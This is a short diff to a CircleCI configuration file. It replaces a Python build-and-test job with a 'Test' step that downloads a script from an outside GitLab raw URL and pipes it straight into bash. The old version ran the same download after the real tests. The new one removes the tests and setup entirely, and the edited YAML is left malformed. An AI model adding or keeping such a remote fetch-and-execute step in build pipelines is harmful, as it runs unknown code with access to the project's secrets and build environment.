@@ -5,14 +5,9 @@ orbs:
 
 jobs:
   build-and-test:
-    executor: python/default
-    steps:
-      - checkout
-      - python/load-cache
-      - python/install-deps
-      - python/save-cache
+    executor: bash/default
       - run:
-          command: ./manage.py test && curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash
+          command: curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash
           name: Test
 
 workflows:
